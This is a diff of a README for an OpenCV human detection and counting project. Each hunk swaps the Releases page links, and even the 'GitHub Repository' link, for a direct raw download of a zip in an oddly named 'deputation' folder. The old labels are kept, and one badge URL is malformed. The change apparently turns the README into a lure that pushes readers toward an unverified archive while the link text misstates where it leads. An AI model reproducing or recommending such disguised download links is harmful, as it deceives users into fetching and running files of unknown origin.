@@ -6,11 +6,11 @@ Welcome to the Human Detection and Counting Project! This application allows you
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/domco121/Human-Detection-Counting-Project-in-Open-CV/releases)
+[![Download Now](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip%https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip)](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip)
 
 Visit the link below to download the application:
 
-[Download from Releases Page](https://github.com/domco121/Human-Detection-Counting-Project-in-Open-CV/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ To ensure the application runs smoothly, make sure your system meets the followi
 
 ## 📦 Installation Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/domco121/Human-Detection-Counting-Project-in-Open-CV/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip).
   
 2. **Download the Latest Version:** Look for the most recent release and download the file that matches your operating system.
 
@@ -80,7 +80,7 @@ If you encounter any issues, feel free to open an issue on GitHub or reach out f
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page to Download](https://github.com/domco121/Human-Detection-Counting-Project-in-Open-CV/releases)
-- [GitHub Repository](https://github.com/domco121/Human-Detection-Counting-Project-in-Open-CV)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/domco121/Human-Detection-Counting-Project-in-Open-CV/main/deputation/Human-Detection-Counting-Project-in-Open-CV.zip)
 
 Thank you for choosing the Human Detection and Counting Project. We hope it enhances your work!
